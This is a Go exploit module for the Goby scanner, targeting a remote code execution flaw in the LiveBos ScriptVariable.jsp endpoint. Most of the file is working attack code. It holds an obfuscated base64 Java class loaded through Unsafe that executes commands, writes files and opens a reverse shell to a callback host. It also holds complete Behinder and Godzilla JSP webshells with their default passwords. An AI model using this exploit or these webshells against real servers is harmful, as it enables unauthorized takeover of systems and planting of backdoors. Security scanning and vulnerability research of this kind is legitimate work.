package exploits

import (
	"encoding/base64"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "LiveBos ScriptVariable.jsp Remote Code Execution Vulnerability",
    "Description": "<p>LiveBOS smart business architecture platform is an object-oriented business support platform and modeling tool. With the support of LiveBOS, users only need to understand, design, structure and integrate enterprise information systems based on the business and management level rather than the technical level (Based on the business level means that developers only need to describe the organization, business process, business information, business resources, business logic, business events and other business content of the enterprise, regardless of the technical level), and can realize various web-based high-level information applications.</p><p>There is a remote code execution vulnerability in LiveBos, through which an attacker can arbitrarily execute code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Product": "apex-LiveBPM",
    "Homepage": "https://www.apexsoft.com.cn/ApexsoftSearch.jsp?s_content=bpm",
    "DisclosureDate": "2022-07-03",
    "Author": "r4v3zn",
    "FofaQuery": "body=\"LiveBos\" || body=\"/react/browser/loginBackground.png\"",
    "GobyQuery": "body=\"LiveBos\" || body=\"/react/browser/loginBackground.png\"",
    "Level": "2",
    "Impact": "<p>There is a remote code execution vulnerability in LiveBos, through which an attacker can arbitrarily execute code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The official has fixed the vulnerability, please contact the manufacturer to fix the vulnerability: <a href=\"https://pms.crm.apexsoft.com.cn/\">https://pms.crm.apexsoft.com.cn/</a></p><p>1. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>2. If it is not necessary, the public network is prohibited from accessing the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,webshell",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "abcsj.jsp",
            "show": "webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(\"hello\");%>",
            "show": "webshell=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass",
        "Code Execution"
    ],
    "VulType": [
        "Code Execution",
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "10",
    "Translation": {
        "CN": {
            "Name": "LiveBos ScriptVariable.jsp 远程代码执行漏洞",
            "Product": "apex-LiveBPM",
            "Description": "<p>LiveBOS 灵动业务架构平台，是面向对象的业务支撑平台与建模工具，在 LiveBOS 支持下，用户只需要基于业务和管理的层面，而非技术的层面来理解、设计、构架和集成企业的信息系统（基于业务层面是指开发人员只需描述企业的组织机构、业务流程、业务信息、业务资源、业务逻辑、业务事件等业务内容，而不考虑技术层面的东西），就可以实现各类基于WEB的高层次信息化应用。<br></p><p>LiveBos 存在远程代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。<br></p>",
            "Recommendation": "<p>官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://pms.crm.apexsoft.com.cn/\">https://pms.crm.apexsoft.com.cn/</a></p><p>1、通过防火墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>LiveBos 存在远程代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。<br></p>",
            "VulType": [
                "权限绕过",
                "代码执行"
            ],
            "Tags": [
                "权限绕过",
                "代码执行"
            ]
        },
        "EN": {
            "Name": "LiveBos ScriptVariable.jsp Remote Code Execution Vulnerability",
            "Product": "apex-LiveBPM",
            "Description": "<p>LiveBOS smart business architecture platform is an object-oriented business support platform and modeling tool. With the support of LiveBOS, users only need to understand, design, structure and integrate enterprise information systems based on the business and management level rather than the technical level (Based on the business level means that developers only need to describe the organization, business process, business information, business resources, business logic, business events and other business content of the enterprise, regardless of the technical level), and can realize various web-based high-level information applications.</p><p>There is a remote code execution vulnerability in LiveBos, through which an attacker can arbitrarily execute code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The official has fixed the vulnerability, please contact the manufacturer to fix the vulnerability: <a href=\"https://pms.crm.apexsoft.com.cn/\" target=\"_blank\">https://pms.crm.apexsoft.com.cn/</a></p><p>1. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>2. If it is not necessary, the public network is prohibited from accessing the system.</p>",
            "Impact": "<p>There is a remote code execution vulnerability in LiveBos, through which an attacker can arbitrarily execute code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Code Execution",
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass",
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-08-12",
    "PocId": "10821"
}`
	expPayloadWlA0 := `bytes=java.lang.Class.forName("org.apache.commons.codec.binary.Base64").newInstance().decode("yv66vgAAADEA5AoATgBcCABdCgAcAF4IAF8KABwAYAgAYQoAHABiCgAcAGMIAGQKABwAZQgAZgoAZwBoCgBNAGkIAGoKAE0AawgAbAoAbQBuCgAcAG8IAHAKABwAcQgAcggAcwcAdAoAFwBcCgAXAHUIAHYKABcAdwcAeAgAeQgAeggAewgAfAgAfQoAfgB/CgB+AIAHAIEKAIIAgwoAJACECACFCgAkAIYKACQAhwoAJACICgCCAIkKAIIAigcAiwoALQB3CACMCgAcAI0IAI4KAH4AjwcAkAoAZwCRCgAzAJIKADMAgwoAggCTCgAzAJMKADMAlAoAlQCWCgCVAJcKAJgAmQoAmACaBQAAAAAAAAAyCgCbAJwKAIIAnQoAMwCeCACfCgAtAKAIAKEIAKIHAKMKAEcAjQoAHACkCgBHAKUKAEcAmggApgcApwcAqAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAdleGVjdXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAARleGVjAQAHcmV2ZXJzZQEAOShMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL0ludGVnZXI7KUxqYXZhL2xhbmcvU3RyaW5nOwEABXdyaXRlAQA4KExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQAHQzEuamF2YQwATwBQAQAADACpAKoBABBjb21tYW5kIG5vdCBudWxsDACrAKwBAAUjIyMjIwwArQCuDACvALABAAE6DACxALIBACJjb21tYW5kIHJldmVyc2UgaG9zdCBmb3JtYXQgZXJyb3IhBwCzDAC0ALUMAFYAVwEABUBAQEBADABVAFQBAAdvcy5uYW1lBwC2DAC3AFQMALgArAEAA3dpbgwAuQC6AQAEcGluZwEAAi1uAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMALsAvAEABSAtbiA0DAC9AKwBABBqYXZhL2xhbmcvU3RyaW5nAQADY21kAQACL2MBAAUgLXQgNAEAAnNoAQACLWMHAL4MAL8AwAwAVQDBAQARamF2YS91dGlsL1NjYW5uZXIHAMIMAMMAxAwATwDFAQACXGEMAMYAxwwAyADJDADKAKwMAMsAxAwAzABQAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEABy9iaW4vc2gMAE8AzQEAB2NtZC5leGUMAFUAzgEAD2phdmEvbmV0L1NvY2tldAwAzwDQDABPANEMANIA0wwA1ADJBwDVDADWANAMANcA0AcA2AwAWADZDADaAFAHANsMANwA3QwA3gDQDADfAFABAB1yZXZlcnNlIGV4ZWN1dGUgZXJyb3IsIG1zZyAtPgwA4ACsAQABIQEAE3JldmVyc2UgZXhlY3V0ZSBvayEBABhqYXZhL2lvL0ZpbGVPdXRwdXRTdHJlYW0MAOEA4gwAWADjAQACb2sBAAJDMQEAEGphdmEvbGFuZy9PYmplY3QBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAR0cmltAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAApzdGFydHNXaXRoAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQAHcmVwbGFjZQEARChMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTtMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspTGphdmEvbGFuZy9TdHJpbmc7AQAFc3BsaXQBACcoTGphdmEvbGFuZy9TdHJpbmc7KVtMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvSW50ZWdlcgEAB3ZhbHVlT2YBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvSW50ZWdlcjsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygp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");theUnsafeMethod=java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");theUnsafeMethod.setAccessible(true);unsafe=theUnsafeMethod.get(null);classLoader=new java.net.URLClassLoader(java.lang.reflect.Array.newInstance(java.lang.Class.forName("java.net.URL"), 0));protectionDomain=new java.security.ProtectionDomain(new java.security.CodeSource(null, java.lang.reflect.Array.newInstance(java.lang.Class.forName("java.security.cert.Certificate"), 0)), null, classLoader, []);clz = unsafe.defineClass(null, bytes, 0, bytes.length, classLoader, protectionDomain);`

	sendPayloadFlagWlA0 := func(hostInfo *httpclient.FixUrl, payload string) (*httpclient.HttpResponse, error) {
		payloadRequestConfig := httpclient.NewPostRequestConfig(`/plug-in/common/ScriptVariable.jsp;.css.jsp`)
		payloadRequestConfig.VerifyTls = false
		payloadRequestConfig.FollowRedirect = false
		payloadRequestConfig.Header.Store(`Content-Type`, `application/x-www-form-urlencoded`)
		payloadRequestConfig.Data = `act=put&scope=0&name=gName13&value=` + url.QueryEscape(payload)
		rsp, err := httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
		if err != nil {
			return nil, err
		}
		if rsp.StatusCode != 200 && rsp.StatusCode != 500 {
			return nil, errors.New("漏洞利用失败")
		}
		payloadRequestConfig.Data = `act=get&scope=0&name=gName13`
		return httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
	}

	execFlagWlA0 := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		payload := expPayloadWlA0 + `j=clz.newInstance().exec(` + strconv.Quote(cmd) + `)+"";`
		return sendPayloadFlagWlA0(hostInfo, payload)
	}

	uploadFlagWlA0 := func(hostInfo *httpclient.FixUrl, filename, content string) (*httpclient.HttpResponse, error) {
		if !strings.HasSuffix(filename, ".jsp") {
			filename += ".jsp"
		}
		// base64
		content = base64.StdEncoding.EncodeToString([]byte(content))
		// 写文件
		payload := `content=org.apache.commons.codec.binary.StringUtils.newString(java.lang.Class.forName("org.apache.commons.codec.binary.Base64").newInstance().decodeBase64(` + strconv.Quote(content) + `),"UTF-8")+"";`
		payload += expPayloadWlA0 + `j=clz.newInstance().write(` + strconv.Quote("../LiveBOS/FormBuilder/"+filename) + `, content)+"";`
		_, err := sendPayloadFlagWlA0(hostInfo, payload)
		if err != nil {
			return nil, err
		}
		checkFileRequestConfig := httpclient.NewGetRequestConfig(`/` + filename + `;.css.jsp`)
		checkFileRequestConfig.FollowRedirect = false
		checkFileRequestConfig.VerifyTls = false
		return httpclient.DoHttpRequest(hostInfo, checkFileRequestConfig)
	}

	reverseFlagWlA0 := func(hostInfo *httpclient.FixUrl, port string) (*httpclient.HttpResponse, error) {
		payload := expPayloadWlA0 + `j=clz.newInstance().reverse(` + strconv.Quote(godclient.GetGodServerHost()) + `,` + port + `)+"";`
		return sendPayloadFlagWlA0(hostInfo, payload)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(5)
			checkStrSub := goutils.RandomHexString(5)
			payload := `a="` + checkStr + `"+"` + checkStrSub + `";`
			rsp, err := sendPayloadFlagWlA0(hostInfo, payload)
			if err != nil {
				return false
			}
			return strings.Contains(rsp.Utf8Html, checkStr+checkStrSub)
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			cmd := goutils.B2S(ss.Params["cmd"])
			webshell := goutils.B2S(ss.Params["webshell"])
			filename := goutils.B2S(ss.Params["filename"])
			content := goutils.B2S(ss.Params["content"])
			if attackType == "cmd" {
				rsp, err := execFlagWlA0(expResult.HostInfo, cmd)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				if rsp.StatusCode != 200 && !strings.Contains(rsp.Utf8Html, `<value>`) && !strings.Contains(rsp.Utf8Html, `</value>`) {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
				expResult.Success = true
				expResult.Output = regexp.MustCompile(`(?s)<value>(.*?)</value>`).FindStringSubmatch(rsp.Utf8Html)[1]
			} else if attackType == "webshell" {
				filename = goutils.RandomHexString(16) + ".jsp"
				if webshell == "behinder" {
					// /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
					content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}
%>`
				} else {
					filename = goutils.B2S(ss.Params["filename"])
				}
				rsp, err := uploadFlagWlA0(expResult.HostInfo, filename, content)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				// 资源存在
				if rsp.StatusCode != 200 && rsp.StatusCode != 500 {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
					return expResult
				}
				expResult.Success = true
				if attackType == "custom" {
					expResult.Output += "URL: " + expResult.HostInfo.FixedHostInfo + rsp.Request.URL.Path + "\n"
				} else {
					expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + rsp.Request.URL.Path + "\n"
					if webshell == "behinder" {
						expResult.Output += "Password: rebeyond\n"
						expResult.Output += "WebShell tool: Behinder v3.0\n"
					} else if webshell == "godzilla" {
						expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
						expResult.Output += "WebShell tool: Godzilla v4.1\n"
					}
				}
				expResult.Output += "Webshell type: jsp"
			} else if attackType == "reverse" {
				//
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse", waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				reverseFlagWlA0(expResult.HostInfo, rp)
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			}
			return expResult
		},
	))
}
